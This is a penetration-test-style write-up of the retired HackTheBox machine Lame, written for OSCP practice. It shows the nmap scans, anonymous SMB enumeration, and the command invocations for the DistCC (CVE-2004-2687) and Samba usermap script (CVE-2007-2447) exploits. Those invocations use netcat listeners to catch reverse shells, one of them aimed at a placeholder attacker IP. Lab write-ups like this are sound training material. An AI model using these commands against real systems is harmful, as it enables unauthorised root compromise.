# HTB Lame - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-11-20

**Target:** 10.129.24.50

**Environment:** HTB Lame (Retired Machine)

---

## 1. Executive Summary

This report documents the results of a penetration test performed against **HTB: Lame**, a single-host Linux target. The goal of the assessment was to evaluate the security posture of the system, identify vulnerabilities, and determine whether the tester could obtain full compromise.

The tester identified multiple exposed services, including FTP, SMB, SSH, and DistCC.  The tester successfully obtained an initial low-privileged shell via a DistCC remote command execution vulnerability (CVE-2004-2687), gaining access as the `daemon` user and capturing the user flag. However, privilege escalation was not achievable from this foothold. The tester then identified a known **Samba 3.0.20 "username map script" remote command execution vulnerability** (CVE-2007-2447), resulting in immediate **root-level access**.

### 1.1 High-Level Results

- Initial foothold obtained via DistCC RCE -> shell as `daemon` and user flag captured.
- Privilege escalation attempts from user `daemon` were unsuccessful.
- vsftpd 2.3.4 backdoor appeared present but unreliable.
- SMB allowed anonymous enumeration and exposed a vulnerable Samba service.
- Successful exploitation of Samba 3.0.20 username map vulnerability -> root shell and root flag captured.

### 1.2 Prioritized Recommendations

1. **Upgrade Samba to a supported version** to remove the username map script RCE vulnerability.
2. **Disable SMB null sessions** to prevent anonymous enumeration.
3. **Restrict exposed services** (FTP, SMB, DistCC) to untrusted networks.
4. **Implement regular patching** to avoid reliance on legacy, vulnerable service versions.

---

## 2 Objective

The objective of this assessment was to identify vulnerabilities on the HTB Lame target host and determine whether an attacker could gain unauthorized access and escalate privileges to root.

## 3. Summary of Technical Findings

| Finding | Severity | Description|
|---------|----------|------------|
| Samba 3.0.20 Username map Script RCE | Critical | Vulnerable Samba version allows remote command execution as root. |
| DistCC Remote Execution (successful foothold) | High | DistCC service exposed, allows execution of arbitrary command and provides shell as `daemon`. |
| SMB Null Session | Medium | Anonymous login and share access were possible. |
| vsftpd 2.3.4 Backdoor (unreliable) | Medium | Backdoor version detected; exploit attempted but not successful. |

---

## 4. Attack chain:

1. Enumerated DistCC (port 3632) and confirmed RCE.
2. Executed DistCC exploit -> obtained shell as user `daemon`.
3. Captured **user.txt**.
4. Attempted privesc paths (socat, SUID search, at-job abuse) but none succeeded.
5. Pivoted to SMB enumeration and identified a vulnerable Samba version.
6. Executed Samba username map script exploit -> obtained **root shell**.
7. Captured **root.txt**.

### 4.1 Flags captured:

 - user.txt (from `daemon` DistCC shell)
 - root.txt (from Samba RCE)

 ---

 ## 5. Methodology

 ### 5.1 Information Gathering

 A full TCP port scan was launched:

```
nmap -p- -sCV 10.129.24.50 -T4 -oA lame_initial
```

Key findings:

- FTP (21)
- SSH (22)
- SMB (139/445)
- DistCC (3632)

### 5.2 Service Enumeration

DistCC enumeration:

```
nmap -p 3632 10.129.24.50 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```

Result confirmed arbitrary command execution.

SMB enumeration:

```
smbclient -L //10.129.24.50 -N
```

Revealed public shares including `/tmp`.

### 5.3 Initial Foothold

#### 5.3.1 DistCC Remote Command Execution (CVE-2004-2687)

Using a public DistCC exploit (Python2), a reverse shell was obtained:

```
python2 distcc_exploit.py 10.129.24.50 1403
```

Listener:

```
nc -lnvp 1403
```

#### 5.3.2 User Proof

User flag retrieved from:

```
/home/makis/user.txt
```

User flag: *REDACTED*

#### 5.3.2 Privilege Escalation Attempts

Several paths were attempted:

- Socat PTY stabilization -> successful but no privesc
- SUID binary enumeration -> no viable escalation vector
- `at` job abuse -> dead end

### 5.4 Root Compromise

#### 5.4.1 SMB Enumeration

Because local privesc failed, SMB enumeration was revisited. Nmap service scan showed:

```
Samba 3.0.20
```

This version is vulnerable to the Samba username map script command execution exploit (CVE-2007-2447).

#### 5.4.2 Samba Username Map Script Exploit (CVE-2007-2447)

Exploit executed:

```
python samba_usermap_script.py 10.129.24.50 445 <ATTACKER-IP> 443
```

Listener caught a root shell:

```
nc -lnvp 443
```

Root access confirmed:

```
id -> uid=0(root)
```

#### 5.4.3 Root Proof

Root flag retrieved from:

```
/root/root.txt
```

Root flag: *REDACTED*

---

## 6. House Cleaning

No files, payloads or shells were left on the host. Temporary shells and scripts were removed before disconnecting.

---

## 7. Conclusion

HTB Lame was fully compromised through two critical vulnerabilities: DistCC remote command execution and the Samba username map script flaw. The attack path required discovery, exploitation, lateral enumeration, and final privilege escalation through a legacy network service.

The methodology, documentation, and exploitation steps in this report align with OSCP exam reporting standards.

---

## Appendix A - Exploit References:

### Samba Username Map Script Exploit (CVE-2007-2447)

Source: [https://github.com/pulkit-mital/samba-usermap-script](https://github.com/pulkit-mital/samba-usermap-script)

### DistCC Remote Execution Exploit (CVE-2004-2687)

Source: [https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)